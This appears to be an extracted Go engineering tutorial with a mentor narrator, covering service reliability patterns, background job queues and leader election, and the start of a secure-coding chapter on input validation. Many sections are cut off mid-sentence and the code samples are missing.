text: Listen up, sport. You built a beautiful service. The metrics are ticking, the traces are flowing, the dashboards look like a work of art. You did all that observability homework and you deserve a little credit. But there's something you haven't faced yet: what happens when the world outside your service stops cooperating? The payment processor goes dark at 11pm. A downstream pod starts crashing under load. A burst of checkout requests hits at the same time a promo email lands. Ten thousand clients all retry at once. A network partition decides to exist. Your service is about to face all of it — and your job is to make sure it doesn't crumple. That is what reliability engineering is: not hoping the world stays well-behaved, but designing the system to keep running even when it isn't. Timeouts, retries, circuit breakers, graceful shutdown, health checks, idempotency, rate limiting — each one is a specific weapon for a specific failure mode, and today you're loading every one of them. I've been writing Go since before the Go team shipped the first public release, and I am telling you: these patterns are the difference between a service that gets paged at 3am and one that handles the s

heading: Timeouts Everywhere
text: A timeout is an upper bound on how long your code will wait for an operation to complete. Without one, a blocked goroutine waits forever — holding a connection, a goroutine stack, and any downstream resources with it. In Go, timeouts are expressed as a context.WithTimeout deadline that propagates cancellation through the entire call tree when time is up. On the job: the absence of a timeout turns a flaky downstream into a full service freeze — the goroutine pile-up blocks new requests until the whole process looks down. Here's the scenario. It's Black Friday. Your checkout service calls an external payment processor. The processor doesn't respond. Not an error — it just… says nothing. The goroutine handling that request sits there, blocking, holding a connection from your pool, occupying a slot in your server's goroutine table. More requests come in. More goroutines block. The connection pool drains. New requests start waiting for a free connection. The whole thing seizes up, and now your service looks down to upstream callers — even though the processor is the sick one. This is called a cascading failure , and the root cause is embarrassingly simple: you made a network call withou

heading: The Default-No-Timeout Trap
text: Go's net/http package has a trap waiting for anyone who uses the zero-value client: http.Get uses http.DefaultClient, whose Timeout field is zero — meaning no timeout at all . A request to a hung server will block forever. The fix is a http.Client with an explicit Timeout, or better still, a context with a deadline so the timeout is composable and cancellation propagates through your whole call tree: The context.WithTimeout approach is superior to the http.Client.Timeout field because: 1. The timeout is per-request — different endpoints get different budgets. 2. Cancellation propagates — if the parent handler is cancelled (e.g. the end user closed the browser), the outbound HTTP call is cancelled too, freeing the connection immediately. 3. The same context flows into DB calls, cache calls, and any goroutine you spawn — one deadline covers the whole operation.

heading: Timeout Sizing
text: Every external call needs its own budget. A quick rules-of-thumb grid: 50–200ms. If your own database or cache isn't responding in under a second, something is broken — don't mask it with a generous timeout. 2–5s. Card networks have their own SLAs. Match your timeout to the documented p99 + a small buffer — not to "infinity just in case." Writes (a POST to create a charge) usually need more time than reads. But they should still have a timeout. Unbounded writes are just unbounded blocking with extra steps. Each query should carry the parent request context. Set SetConnMaxLifetime and SetConnMaxIdleTime on the pool too — that's the pool-level backstop. The server-side handler timeout (set on http.Server.ReadHeaderTimeout, WriteTimeout, or via middleware) is the outer envelope. Each downstream call's timeout must fit inside it. Never set a database context deadline that is longer than your HTTP server's WriteTimeout. The client will have disconnected long before your DB query returns, and you'll have spent resources on a result nobody will ever read. Here's a complete, runnable checkout client that shows the right pattern: http.Client with no global timeout, context.WithTimeout per-c

heading: Retries with Backoff and Jitter
text: A retry re-sends a failed request automatically, but naive immediate retries can make a struggling downstream worse. Exponential backoff grows the wait between retries (base × 2ⁿ) so each successive attempt gives the downstream more breathing room. Jitter adds randomness to that wait so a fleet of services doesn't all retry at the same instant (the thundering herd ). Together they turn a wall of hammering retries into a gentle, spread-out drizzle. On the job: retries without jitter on a 500-instance fleet can convert a 10 % failure rate into a 100 % failure rate by stampeding the recovering downstream. You applied a timeout and now your payment call fails fast. Great. But sometimes failure is transient — the processor had a brief hiccup, a pod restarted, a network blip. Failing fast and returning 500 to your customer every time is almost as bad as hanging. The right answer is retrying — but only the right operations , and only in the right way .

heading: Only Retry Idempotent, Safe Operations
text: This is the rule that separates good retries from catastrophic ones: you may only blindly retry an operation if retrying it twice produces the same result as retrying it once. A GET /orders/123 is safe to retry — reading data doesn't change it. A POST /charge is not safe to retry without an idempotency key — retrying a charge might charge the customer twice. We'll cover idempotency keys in depth in section 6. For now: before you add a retry loop around anything, ask yourself "if this runs twice, does the customer lose money or data?" If yes, add an idempotency key first , then add the retry.

heading: Exponential Backoff
text: Naive retry: retry immediately, N times. This is almost always wrong. If the downstream service is overwhelmed, hammering it with immediate retries makes the situation worse for everyone. Exponential backoff: after each failure, wait longer before the next attempt. The wait time grows exponentially — typically base 2^(attempt-1): Attempt Wait (base=200ms) --------- ------------------- 1 (fail) 0ms (first try) 2 (retry) 200ms 3 (retry) 400ms 4 (retry) 800ms But here's the problem with pure exponential backoff: if 500 instances of your service all fail at the same time (say, a pod restart), they will all compute the same wait time and retry at the same moment — a perfectly synchronized stampede that overwhelms the recovering downstream. This is called the thundering herd .

heading: Full Jitter: Why It Prevents the Thundering Herd
text: The fix is jitter — randomness added to the backoff delay. The most effective form is full jitter : pick a random value in the range [0, exponential cap) rather than waiting the full exponential time. With full jitter, 500 instances retrying simultaneously will now retry at random times spread across the backoff window — the thundering herd dissolves into a gentle drizzle.

heading: A Complete Retry Loop with Budget
text: Here's a self-contained, runnable backoff calculator: Each retry multiplies your outbound request rate. Three retries with three replicas means a single user action can produce nine calls to the downstream. Under a high-error-rate event, this is how a retry storm turns a 10% failure rate into a 100% failure rate. Fix: track a retry budget — a cap on the total fraction of outbound calls that are retries. If more than (say) 10% of your payment calls are retries, stop retrying entirely and fail fast. The circuit breaker in the next section is the production-grade implementation of this idea. --

heading: Circuit Breakers
text: The breaker is a literal gate with three positions — watch it slam, hold, and probe: A circuit breaker is a state machine that sits between your service and a downstream. Closed — normal; calls flow through and failures are counted. Open — the failure threshold was hit; all calls fail immediately with a sentinel error, no network call made, giving the downstream time to recover. Half-Open — after a cooldown, one probe call is allowed through; if it succeeds the circuit closes, if it fails the circuit re-opens. On the job: retrying against a genuinely down downstream wastes resources and prolongs its recovery — the circuit breaker is what turns that retry storm into a controlled pause. A retry loop is the right tool for transient failures — brief hiccups that clear on their own. But what about a downstream that is genuinely down for minutes? Retrying against it wastes resources and keeps your users waiting through three doomed attempts on every request. Worse, it prolongs the recovery of the downstream by hammering it while it's trying to come back. The circuit breaker is the solution. It's a state machine that sits between your service and a downstream. When failures pile up past a

heading: The Three States
text: Calls flow normally. The breaker counts failures. Below the threshold, everything passes through. This is the normal operating state. The failure threshold was exceeded. All calls fail immediately with a sentinel error — no network call is made. The downstream gets breathing room to recover. After the cooldown expires, one probe call is allowed through. If it succeeds, the circuit closes. If it fails, the circuit opens again and the cooldown resets. Don't set the failure threshold too low or the cooldown too short. A threshold of 1 failure means a single transient error trips the breaker. A cooldown of 1 second means you're probing a downstream that's been down for 30 seconds every second — still hammering it. Start with threshold≥5, cooldown≥10s.

heading: A Runnable Circuit Breaker State Machine
text: The circuit breaker above uses a sync.Mutex to protect the state transitions. This is the correct tool here: the state (State, failures, openAt) is shared across goroutines (every concurrent request consults the same breaker) and the transitions are compound operations (read state, maybe change state, update timestamp) that must be atomic. An atomic.Int32 for failures alone wouldn't be enough — you'd have a TOCTOU race between reading failures and writing state. In production libraries like sony/gobreaker (the de facto standard in Go), the same mutex pattern is used, with some additions: Sliding window counting instead of a simple consecutive-failure counter, so a brief burst of errors in an otherwise-healthy service doesn't trip the breaker permanently. A OnStateChange callback for emitting a metrics event when the state changes — critical for dashboards and alerting. Half-open call limiting : some implementations only allow one goroutine to probe, blocking others with a semaphore so a thundering probe herd doesn't form. As of Go 1.24, there is no circuit breaker in the standard library. sony/gobreaker is the common choice; it's small, dependency-free, and worth reading. --

heading: Bulkhead Isolation
text: Bulkhead isolation partitions a system's concurrent capacity into isolated resource pools per downstream dependency. If one downstream slows down or crashes, it only exhausts its own dedicated bulkhead pool — preventing resource starvation from cascading to the rest of the application. On the job: without bulkheads, a slow third-party analytics API can tie up all 2,000 HTTP client goroutines, causing high-priority credit card checkouts to fail. The name comes from naval architecture: a ship is partitioned into watertight compartments called bulkheads. If the hull is breached in compartment 3, water fills compartment 3, but the bulkheads prevent water from flooding the rest of the ship. The ship stays afloat. In a Go microservice, your shared resources are goroutines, open TCP connections, memory, and CPU cycles . When you make outbound HTTP, gRPC, or SQL calls, you are borrowing capacity from these shared resources.

heading: Semaphore-Bounded Bulkheads in Go
text: In languages like Java, bulkheads are often implemented using dedicated OS thread pools (e.g. Netflix Hystrix). In Go, goroutines are multiplexed by the M:N scheduler, so creating separate OS thread pools is unnecessary and counterproductive. Instead, Go implements bulkheads using semaphore channels (chan struct ) or golang.org/x/sync/semaphore.Weighted. A production Go bulkhead provides: 1. Concurrency Limit: Max in-flight goroutines allowed for that dependency. 2. Bounded Queue (Optional): Small backlog buffer before fast-failing. 3. Execution Gating: Non-blocking TryAcquire() for immediate fast-fail or Acquire(ctx) with a strict queue deadline. 4. Metrics Instrumentation: Observability into active concurrency, rejected requests, and queue wait times. In traditional multi-threaded runtimes (Java, C++, .NET), bulkheads require allocating distinct OS thread pools (e.g., 20 threads for Service A, 10 threads for Service B). This incurs huge overhead: Each OS thread costs 1–2 MB of stack memory. Context switching between OS threads incurs kernel transition and TLB cache invalidation overhead. In Go's M:N runtime: Goroutines are multiplexed across GOMAXPROCS OS threads. A channel semap

heading: Graceful Degradation and Fallback Caches
text: Graceful degradation is the architectural practice of maintaining partial service functionality when dependencies fail. A stale fallback cache stores the last known successful response from an upstream dependency with an extended stale-grace TTL; when the dependency fails or its circuit breaker opens, the system serves the cached stale data rather than returning an error. On the job: if Meridian's currency conversion API goes down, the checkout service serves exchange rates cached 15 minutes ago (flagged as degraded) instead of aborting customer purchases. When an upstream dependency fails, times out, or trips an open circuit breaker, you have three options: 1. Hard Failure (Fail-Stop): Return an HTTP 500 / 503 error to the client. This breaks user journeys. 2. Feature Omission (Silent Drop): Return the response without the failed component (e.g. render user profile without the "recommended friends" sidebar). 3. Stale Fallback Caching (Serve Stale): Serve the most recently cached valid response stamped with stale: true metadata.

heading: Stale-While-Revalidate Dual-TTL Architecture
text: A resilient fallback cache uses two distinct TTL thresholds: freshTTL (e.g. 1 minute): Within this window, cached data is considered completely fresh and returned immediately without contacting upstream. staleGraceTTL (e.g. 24 hours): Beyond freshTTL, the data is stale. Normal requests will attempt to fetch fresh data from upstream. But if upstream fails, times out, or the circuit breaker is OPEN, the cache falls back to serving this stale data. Serving stale cache data is a business decision with financial and legal consequences. Safe to serve stale (with Degraded metadata): Foreign exchange reference rates (for display purposes). Product catalog titles, descriptions, and thumbnail image URLs. Merchant profile metadata and public configuration. NEVER serve stale: Customer account balance or available credit limits. Payment authorization decisions or fraud risk scores. Idempotency verification tokens. Cryptographic keys or JWT signing public keys during key rotation. Always pair stale fallback data with clear observability alerts and client-facing degradation headers (e.g. Warning: 199 - "Degraded: serving cached rates"). --

heading: Graceful Shutdown
text: Graceful shutdown means stopping a service in an ordered way: stop accepting new work, finish work already in progress, then release resources and exit. The alternative — an abrupt exit on SIGTERM — sends a TCP RST to every in-flight connection, which the caller sees as an error. On the job: a checkout service that exits immediately on deploy drops every payment in flight; graceful shutdown is the difference between zero dropped requests and a spike of 503s in your error budget on every deploy. Your service is running. You push a new version. Kubernetes sends SIGTERM. If your binary exits immediately, every in-flight request gets a TCP RST — the user sees an error. That's not acceptable for a checkout flow. Graceful shutdown means: stop accepting new work, finish the work already in progress, then exit. The pattern has four ordered steps: 1. Receive the signal — signal.NotifyContext gives you a context that's cancelled when SIGTERM or SIGINT arrives. 2. Stop accepting new requests — call server.Shutdown(ctx). This closes the listener so no new TCP connections are accepted. 3. Drain in-flight requests — server.Shutdown waits for active requests to complete (up to the shutdown timeou

heading: Health and Readiness
text: A liveness check (/healthz) answers "is this process alive?" — it should be fast, cheap, and check only the process itself. Kubernetes kills and restarts the container if liveness fails. A readiness check (/readyz) answers "is this instance ready to serve traffic?" — it should verify external dependencies (DB, cache). Kubernetes removes the pod from the load balancer pool if readiness fails, with no restart. On the job: conflating liveness and readiness — putting a DB ping on /healthz — causes Kubernetes to restart your pod every time the database hiccups, turning a brief DB slowdown into cascading pod restarts. You have two endpoints to build: /healthz (liveness) and /readyz (readiness). They sound similar. They do completely different jobs, and conflating them is one of the most common Kubernetes foot-guns I've seen — and I've seen a lot.

heading: Liveness vs. Readiness
text: Liveness (/healthz): "Is this process alive and not stuck in a deadlock or infinite loop?" If liveness fails, Kubernetes kills and restarts the container. The check must be fast, cheap, and almost never fail — a failed liveness check is a hard restart with potential request loss. It should check the process itself, not external dependencies. Readiness (/readyz): "Is this instance ready to receive traffic?" If readiness fails, Kubernetes removes the pod from the load balancer's backend pool. The check should verify that dependencies (DB, cache) are reachable. A failed readiness check is gentle — no restart, just traffic rerouting. The readiness handler should check everything a request depends on: database ping, cache ping, any mandatory config loaded. If any dependency is unhealthy, return 503. Kubernetes will stop sending traffic to this instance until it recovers. Return a JSON body from /readyz that names each check and its status — . This makes debugging a failing readiness probe trivially easy from kubectl exec or a log. A bare 503 with no body is annoying at 3am. --

heading: Idempotency
text: An operation is idempotent if executing it twice produces the same result as executing it once. A GET /orders/123 is naturally idempotent — reading changes nothing. A POST /charge is not — sending it twice charges the customer twice. An idempotency key is a unique token the client generates once and attaches to the request; the server stores the result against the key and returns the stored result on any duplicate request instead of re-executing. On the job: without idempotency keys, every retry of a failed payment is a potential double-charge — networks always retry, so you must design writes to survive being sent more than once. Here's a scenario: the customer clicks "Pay." Your service posts to the payment processor. The network hiccups on the response. Did the charge go through? You don't know. If you retry the POST /charge naively, you might charge the customer twice. The solution is an idempotency key — a unique token the client generates and sends with the request. The server stores it alongside the result. If the same key arrives again (a retry), the server returns the stored result without re-executing the operation. The deep implementation — how to store keys with atomic

heading: Rate Limiting in Depth
text: Rate limiting caps how many requests a caller (or the whole service) can make in a time window, protecting capacity from a single bad actor or burst. Token bucket: a bucket holds up to N tokens; each request consumes one; tokens refill at a fixed rate. It allows short bursts (draining the bucket) then enforces the fill rate — this is what golang.org/x/time/rate implements. Leaky bucket: requests queue up and exit at a fixed constant rate regardless of arrival — useful for smoothing output to a downstream that can't absorb bursts. On the job: without per-client rate limits, a single misbehaving API key can saturate your entire connection pool and take down the service for everyone else. Rate limiting answers the question: "how do I prevent one caller from consuming all available capacity?" The choice of algorithm dictates how your service behaves during bursts, how much memory is consumed per active client key, and whether rate limiting remains accurate across multi-replica clusters.

heading: Algorithm Comparison Matrix
text: Algorithm Memory per Key CPU Cost Burst Handling Boundary Spike Risk Primary Use Case :--- :--- :--- :--- :--- :--- Token Bucket $O(1)$ ( 32 bytes) $O(1)$ (lazy time math) Allows bursts up to bucket capacity $B$ None (continuous refill) Inbound API gateway protection, client quotas Leaky Bucket $O(1)$ ( 24 bytes) $O(1)$ (scheduled delay) Zero burst (strictly meters output rate) None (uniform spacing) Outbound traffic shaping to sensitive/legacy APIs Fixed Window $O(1)$ ( 8 bytes) $O(1)$ (atomic increment) Resets at boundary High (2× burst at window edge) Simple bulk DDoS damping, coarse metrics Sliding Window Log $O(N)$ (stores $N$ timestamps) $O(\log N)$ (sorted set range) Enforces exact rate limit over rolling window Zero (mathematically exact) High-stakes fintech limits (e.g. max 5 transfers/min) Sliding Window Counter $O(1)$ (2 counter integers) $O(1)$ (weighted multiplication) Smooth sliding blend Low (under 0.05% variance) High-throughput distributed rate limiting in Redis --

heading: 1. Token Bucket: Standard vs. Custom In-Memory
text: The Token Bucket algorithm models a bucket of capacity $B$ that accumulates tokens at rate $R$ tokens/second. A request consumes 1 token. If the bucket is empty, the request is rejected or queued. While golang.org/x/time/rate is the standard library solution, understanding how to build an in-memory token bucket from scratch reveals how Go handles nanosecond-precision rate accounting without background goroutines. A naive token bucket implementation might launch a background goroutine with time.NewTicker to add tokens every millisecond. With 100,000 active API keys, that would spawn 100,000 tickers waking up the Go runtime scheduler millions of times per second. Instead, both x/time/rate and our custom bucket use lazy arithmetic evaluation : On every invocation of Allow() or Wait(), the current timestamp is recorded, the delta time is computed, and tokens are updated synchronously under a sync.Mutex. If a key remains idle for an hour, zero CPU cycles are spent — when the client finally calls again, the math instantly computes tokens = capacity. --

heading: 2. Leaky Bucket: Egress Traffic Shaping
text: While Token Bucket controls inbound burst capacity , Leaky Bucket controls outbound spacing . It guarantees that requests leave at a constant, uniform rate $\Delta t = 1/R$, completely flattening any burst. On the job: Meridian integrates with an older card-network settlement mainframe that hard-crashes if it receives more than 5 requests in any 100ms interval. A token bucket with burst=5 would let all 5 through in 1ms. A Leaky Bucket Shaper forces exactly 20ms between outbound requests, protecting the downstream mainframe. --

heading: 3. Sliding Window Log vs. Sliding Window Counter
text: Fixed-window limiters suffer from a severe boundary double-burst vulnerability : if a client is allowed 100 req/min, they can send 100 requests at 00:59 and 100 requests at 01:01 — totaling 200 requests within a 2-second interval without violating either fixed window. Two sliding window algorithms solve this problem: Sliding Window Log (Exact Timestamp Tracking) The Sliding Window Log maintains a list of timestamps for every request made within the rolling window. On each request: 1. Evict timestamps older than now - windowSize. 2. If remaining count is less than limit, append now and allow; else reject. Pros: 100% mathematically exact; zero edge anomalies. Cons: High memory overhead ($O(N)$ entries per active user). In Redis, this is implemented using a Sorted Set (ZSET) and executed via an atomic Lua script: Sliding Window Counter (Memory-Optimized Weighted Average) Instead of storing individual timestamps, the Sliding Window Counter divides time into fixed windows and estimates the rolling request count using a weighted average : Pros: Constant $O(1)$ memory per key (only 2 integers stored!). Cons: Small mathematical approximation assuming uniform request distribution in the pre

heading: Per-Key Rate Limiting with TTL Eviction
text: In production systems handling millions of distinct API keys, IP addresses, or account IDs, storing limiters in a plain map[string] rate.Limiter causes an unbounded memory leak because stale keys from one-off callers never get deleted. A production per-key limiter tracks access timestamps and runs a background sweeper to evict inactive limiters: Don't reach for Redis rate limiting before you need it. A single Go service with a per-process x/time/rate or in-memory sliding window limiter handles millions of requests per second — it's fast, zero-dependency, and correct for a single instance. You only need distributed limiting when: 1. You run multiple replicas and the per-key quota must be enforced globally across all of them. 2. You need rate limit state to survive service restarts and deployments. 3. Different services in your mesh share a unified quota pool (e.g. both the API gateway and the background webhook worker consume the same customer API quota). In fintech fraud prevention (such as "no user may initiate more than 5 wire transfers per minute"), Redis Sliding Window Counter is mandatory because transfer requests may hit any replica. --

desc: In-process cron and tickers; job queues (Asynq on Redis, River on Postgres); delayed/retryable jobs with backoff and dead-letters; idempotent handlers and draining shutdown; and leader election so a scheduled job fires once across replicas.
text: Listen up, because this is where the amateurs get separated from the engineers. Any junior can write a handler that returns a 200. What they cannot do — what trips up nearly everyone who hasn't had the privilege of learning from me — is correctly answer the question: "What happens to the work that doesn't fit in a request?" Nightly reconciliation. Sending receipt emails. Retrying failed webhook deliveries. Jobs that are slow, jobs that should survive a crash, jobs that need one elected runner even when twelve replicas of your service are all screaming to fire simultaneously. That's what this chapter is. Background jobs, scheduling, async work — the quiet engine underneath every serious production service. You'll run it without flinching, and you'll do it correctly. Because I refuse to be associated with dropped work.

heading: Scheduled Work
text: Let me paint the picture, sport. You're on the payments team. Every night at 2 a.m. your service has to reconcile your internal ledger against your payment processor's settlement files — compare every transaction, flag mismatches, and wake up the on-call engineer if the books don't balance. It runs on a schedule. It runs on a wall clock. And if it fires more than once you've got a very awkward morning conversation. We're going to start simple — in-process scheduling — before we earn the right to talk about the distributed version. A ticker fires at a fixed interval regardless of wall-clock time — "every 5 minutes from when the process started." A cron fires at a wall-clock moment — "every day at 02:00 UTC" — using a Unix cron expression. Use a ticker for polling loops; use a cron when the schedule must align to a real clock. Both run inside the process and fire on every replica unless you add coordination (see leader election below).

heading: time.Ticker: fixed intervals
text: A time.Ticker fires on a fixed interval, independent of when the last tick was handled. It's the heartbeat of a polling loop. A time.Ticker fires every N nanoseconds from the moment it was created, regardless of how long your handler takes. If reconcile takes 4s and your ticker fires every 5s, you get 1s of idle time — fine. But if reconcile takes 6s, the next tick fired during that run is dropped (the channel's one-slot buffer is already full), so the effective interval is 11s. For jobs where the wall-clock schedule matters (run at 02:00 exactly, not "roughly every 24 hours"), use robfig/cron instead.

heading: robfig/cron: wall-clock schedules
text: time.Ticker is for intervals ("every 5 minutes"). robfig/cron is for wall-clock schedules ("every day at 02:00 UTC"). It speaks a Unix cron expression and parks execution until the next scheduled wall-clock moment. Standard cron: minute hour dom month dow. "0 2 " = every day at 02:00. robfig/cron with WithSeconds(): second minute hour dom month dow. "0 0 2 " = same, at the second boundary. Returns a context whose Done channel closes after all running jobs finish. Perfect for graceful shutdown — call it in your signal handler and wait. A naively deployed cron fires on EVERY running replica. Two pods? Two reconciliations. Ten pods? Ten. The fix — leader election — is coming in the Distributed Reality section. Do not ship a cron job without it.

heading: Job Queues
text: A job queue is a durable store of units of work ("jobs") that producers enqueue and workers consume asynchronously. The HTTP handler enqueues quickly and returns; a separate worker process picks up the job, executes it, and acknowledges it. If the worker crashes before the ack, the job reappears for retry — that durability is what makes the queue more than just a channel. Asynq backs jobs in Redis; River stores them in a Postgres table inside your own database, enabling transactional enqueue. Without a queue, slow or flaky work blocks your HTTP response and drops work on crashes. Now we get to the good stuff. Here's the scenario: a user completes a payment. Your handler records the transaction in the database. It should also send a receipt email and notify your fraud-detection pipeline — but those operations are slow, flaky, and if they block the HTTP response the user is sitting there watching a spinner while your email provider has a hiccup. The answer is a job queue : enqueue the work as a small serialized record, return the 200 immediately, and let a separate worker process it asynchronously, with retries.

heading: Asynq — Redis-backed job queue
text: Asynq (github.com/hibiken/asynq) is the de-facto Redis-backed job queue for Go. Workers long-poll a sorted set of pending tasks and execute them with configurable concurrency. It gives you delayed jobs, scheduled cron, per-queue priorities, and a built-in web UI (Asynqmon).

heading: Sending the actual email — net/smtp
text: The handler above bottoms out in sendEmail, which we kept abstract. Here it is for real — and it's the same mailer the verification email from Auth & API Design (Part 1) needs. Every transactional message at Meridian — verify-address, receipt, settlement notice — funnels through one Mailer: The handler holds its Mailer as a dependency (inject it via a handler struct — mux.HandleFunc(TypeReceiptEmail, h.Handle) — not a package global). The reason all of this lives behind a queue instead of inline in the payment handler: sending mail is slow, flaky, and third-party. Block the HTTP request on it and your checkout p99 becomes your mail provider's p99. But "behind a queue" means at-least-once — the handler will sometimes run twice (a retry after a timeout that actually delivered). So the send must be idempotent: record that this receipt went out, and a re-run skips it. That dedup is the part you can actually run: smtp.SendMail returning an error is a transient failure most of the time — the provider hiccuped. You don't drop the receipt; you let the queue retry it with exponential backoff, and after max attempts it lands in the dead-letter queue for a human. That machinery is the next se

heading: River — Postgres-backed job queue
text: River (github.com/riverqueue/river) stores jobs in a Postgres table inside your application's own database. You get ACID guarantees around enqueue (enqueue inside the same transaction as your business write — the job only exists if the payment row does), Postgres-native job inspection, and zero new infrastructure if you're already on Postgres. Fast, fire-and-forget style. Sub-millisecond enqueue. Best when you already have Redis and want minimal Postgres load. At-least-once via visibility timeout. Transactional enqueue — the job only exists if your business write commits. Great for payments where the job and the row must be atomic. Uses SKIP LOCKED for worker polling. Neither Asynq nor River gives you exactly-once processing — they both guarantee at-least-once. Your handler WILL run more than once on retries or network partitions. Design every handler to be idempotent from day one, not as an afterthought. Asynq stores jobs in Redis sorted sets (ZSETs) keyed by state: asynq: :pending, asynq: :active, asynq: :scheduled, and asynq: :retry. When a worker claims a job, Asynq atomically moves the task record from the pending ZSET into the active ZSET and records a deadline — the score in

heading: Retries & Resilience
text: A retryable job is a job whose handler, on failure, is automatically re-queued after a delay instead of being dropped. The delay grows exponentially on each attempt ( exponential backoff ) to avoid hammering a recovering downstream. Max attempts caps the total tries so a permanently broken job doesn't loop forever. Without retries, a transient email-provider hiccup silently drops the receipt and the user never hears from you. Your email provider had a hiccup. The fraud API was behind a gateway timeout. These things happen in production every single day. A job queue without retries is just a buffer — a job queue with retries is an actual resilience layer.

heading: Backoff, max-attempts, and dead letters
text: When a job handler returns a non-nil error, the queue schedules a retry. The retry should not happen immediately (you'd hammer a broken service), and it should not retry forever (a truly broken job shouldn't clog the queue). The standard pattern is exponential backoff with jitter . A handler is idempotent if calling it a second time with the same job produces the same outcome as calling it once — no double email, no double charge, no duplicate ledger entry. Job queues are at-least-once: a crash between execution and acknowledgment will re-deliver the job. Every handler must be designed idempotent from day one, not retrofitted later. The standard technique is a deduplication key : record that this txID was processed; on the second delivery, detect the record and skip the side effect.

heading: Idempotent handlers
text: Because retries are guaranteed, a job handler WILL run more than once for the same logical job. An idempotent handler produces the same outcome whether it runs once or ten times. There are two practical techniques: Deduplication key in your own store: When a job exhausts all retry attempts the queue moves it to the dead-letter queue (DLQ) — a separate holding area, not a trash can. The job's payload is preserved for human inspection. A good DLQ has alerting on depth (non-zero depth = something is systematically broken), tooling for manual re-queue after a root-cause fix, and post-incident test coverage for the failure mode. Ignoring the DLQ means silently dropped work — missed receipts, unprocessed settlements, phantom transactions.

heading: Dead-letter queues
text: When a job exhausts all retry attempts, it moves to the dead-letter queue (DLQ). The DLQ is not a trash can — it is a holding pen for human triage. A good DLQ workflow looks like: 1. Job exceeds MaxAttempts → moves to DLQ state. 2. Alerting fires (monitor the DLQ depth as a metric). 3. On-call engineer inspects the payload, fixes the root cause, and manually re-queues or discards the job. 4. Post-incident: add a test for that failure mode.

heading: Graceful shutdown that drains in-flight jobs
text: When a SIGTERM arrives (your Kubernetes rolling update, a scale-down), the worst thing you can do is os.Exit(0). A job is running. It's halfway through marking a payment as settled. os.Exit kills it mid-flight, the job is not acked, and it reappears for retry in an inconsistent state. The right move: stop accepting new jobs, finish the ones in flight.

heading: Distributed Reality
text: Leader election is the process by which a fleet of identical replicas agree that exactly one of them — the leader — will perform a privileged action (e.g., run the nightly reconciliation job) while the others stand down. All replicas race to acquire a lease — a short-TTL key in a shared store (Redis SET NX, etcd, or the Kubernetes Lease API). The winner is leader. If the leader crashes, the TTL expires automatically and the next election fires. Without leader election, a scheduled job on a 3-replica service runs three times simultaneously — triple processing, triple alerts, and a very confused on-call rotation. Here's where the chapter earns its keep, and where a frightening number of engineers stop thinking. You have a nightly reconciliation job. You deploy it. It runs perfectly on one pod. Then you scale to three replicas because traffic is growing. Congratulations. Your reconciliation now fires three times every night, each one trying to reconcile the same ledger against the same settlement files. Three sets of mismatch alerts. Three angry on-call pages. Three very confused engineers. That's not a production system — that's a hazing ritual. The fix is leader election : exactly o

heading: The lease model
text: Leader election in a distributed system works by having all replicas race to acquire a lease — a key in a shared store (Redis, etcd, or Kubernetes' coordination.k8s.io/v1 Lease) with a short TTL. The replica that wins the race owns the lease and is the leader . It must renew the lease before it expires. If the leader crashes, the lease expires and a new election fires automatically. The core primitive is SET key value NX PX ttl ms — Redis's atomic "set if not exists with expiry." Only one caller in a fleet succeeds; all others get a null reply. This is implemented inside Redis as a single-threaded operation — there is no concurrent write window. The TTL is the safety valve. If the leader process is OOM-killed, the lease expires automatically after ttl milliseconds and a new election fires at the next cron tick. This bounds the outage to at most one missed run window — acceptable for "run once" jobs. Renewal keeps the leader healthy. The leader runs a background goroutine that calls the check-and-extend Lua script every ttl/3 to keep the lease alive. The Lua script is atomic — it only extends the TTL if the current owner matches, preventing a zombie (a slow leader that lost its leas

desc: Hostile input by default; the allocation-bomb DoS (bounding untrusted length/offset fields, grounded in the 2026 x/image OOM CVEs); the injection family (SQL, command, path traversal); SSRF; XSS and html/template auto-escaping; TLS and security headers; secrets out of logs; and supply-chain scanning with govulncheck.
text: Listen closely, sport, because I'm only going to say this once — and frankly, I resent having to say it at all, because any engineer worth the salary already lives by it. Every byte that arrives over the network is a weapon aimed at your service. The database chapter gave you parameterized queries. The servers chapter gave you strict decoders. The config chapter told you not to log secrets. This chapter welds all of that into a single, coherent doctrine: the secure-coding hygiene your service needs before it touches production, no matter what it does. Part 3 will layer the fintech-specific controls on top. But you can't build a vault on a foundation that cracks. Let's harden the foundation.

heading: Input is Hostile
text: Here's the scenario. Your ledger API's /checkout handler accepts a JSON body with a promo code, an amount, and an items array. A customer fires a perfectly shaped request. Then a researcher fires one with "amount": -99999, a 10-megabyte items array, and seventeen unknown fields you never defined. Your handler receives both requests — it can't tell them apart by address alone. Every external input is hostile by default. Not maybe-hostile. Not hostile-until-proven-innocent. Hostile. Period.

heading: The two rules: allow-lists and strict decoding
text: Input validation is the act of inspecting every external value against a specification of what is acceptable before it touches any business logic or database. An allow-list defines the exact set of permitted values — correct format, range, length — and rejects everything else. Its opposite, a deny-list, blocks only known-bad values and is always incomplete: attackers find variants you haven't listed. Allow-list validation at the entry point is the first line of defence for Meridian's payment API. Allow-lists beat deny-lists every time. A deny-list says "reject these known-bad values." An allow-list says "accept only these known-good values." Deny-lists rot — an attacker finds a variant you didn't block. Allow-lists hold — you only pass what you explicitly permit. Decode into strict shapes. Go's encoding/json package is lenient by default: unknown fields are silently ignored, and there's no limit on body size. You must opt into strictness. Both of these were introduced back in the HTTP servers chapter; here they're security controls, not just hygiene: http.MaxBytesReader wraps the body so reading beyond the limit returns an error instead of allocating unbounded memory. DisallowUnkno

heading: Validate at the boundary, not deep inside
text: The rule is: validate and normalize inputs as close to the entry point as possible, then pass only clean values deeper. A validateCheckout function that runs before any database or business logic is the sentinel at the gate: The regex is an allow-list: it specifies the exact shape a promo code can take, not a list of shapes to reject. Everything that doesn't match is rejected. Normalization (trimming whitespace, lowercasing, canonicalizing unicode) comes before validation. A " SAVE10 " promo code with leading/trailing spaces is either a valid "SAVE10" after trimming or a bug in the caller — decide which, then enforce it consistently. An attacker who can slip a value past validation by encoding it differently has won. Canonicalize first, then apply your allow-list.

heading: The allocation bomb: when a length field is the weapon
